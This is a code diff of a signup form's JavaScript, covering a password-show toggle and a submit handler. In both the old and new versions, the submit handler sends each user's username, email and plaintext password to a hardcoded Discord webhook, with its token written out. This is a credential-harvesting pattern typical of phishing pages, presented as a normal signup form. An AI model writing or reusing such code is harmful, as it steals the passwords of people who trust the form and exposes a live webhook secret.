@@ -1,41 +1,55 @@
-document.getElementById('toggleSignupPassword').addEventListener('click', function () {
-    const passwordInput = document.getElementById('newPassword');
-    const type = passwordInput.type === 'password' ? 'text' : 'password';
-    passwordInput.type = type;
+const togglePasswordSignUp = document.getElementById("togglePassword");
+const passwordInputSignUp = document.getElementById("password");
+const signupForm = document.getElementById("signupForm");
 
-    if (type === 'password') {
-        this.textContent = '👁️';
-    } else {
-        this.textContent = '🙈';
-    }
+togglePasswordSignUp.addEventListener("click", function () {
+    // Toggle the type attribute of the password input field
+    const type = passwordInputSignUp.type === "password" ? "text" : "password";
+    passwordInputSignUp.type = type;
+
+    // Toggle the eye icon between open and closed
+    this.textContent = type === "password" ? "👁️" : "🚫";
 });
 
-document.getElementById('signupForm').addEventListener('submit', function (event) {
+signupForm.addEventListener("submit", function (event) {
     event.preventDefault();
 
-    const username = document.getElementById('newUsername').value;
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('newPassword').value;
+    // Collect username, email, and password
+    const username = document.getElementById("username").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-    const webhookURL = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
-
-    const embedPayload = {
-        embeds: [
-            {
-                title: "New Account Created",
-                description: `Username: **${username}**\nEmail: **${email}**\nPassword: **${password}**`,
-                color: 0x808080
-            }
-        ]
+    // Prepare the data to send to the webhook
+    const data = {
+        username: username,
+        email: email,
+        password: password,
     };
 
-    fetch(webhookURL, {
-        method: 'POST',
+    // Send the data to the Discord webhook
+    fetch("https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr", {
+        method: "POST",
         headers: {
-            'Content-Type': 'application/json'
+            "Content-Type": "application/json"
         },
-        body: JSON.stringify(embedPayload)
-    }).catch(error => {
-        console.error('Error sending to Discord:', error);
+        body: JSON.stringify({
+            embeds: [
+                {
+                    title: "New User",
+                    description: `User: ${data.username} has been created with the password: ${data.password}`,
+                    color: 16777215 // White color
+                }
+            ]
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Success:', data);
+    })
+    .catch((error) => {
+        console.error('Error:', error);
     });
+
+    // Optionally, you can redirect or reset the form after successful submission
+    signupForm.reset();
 });
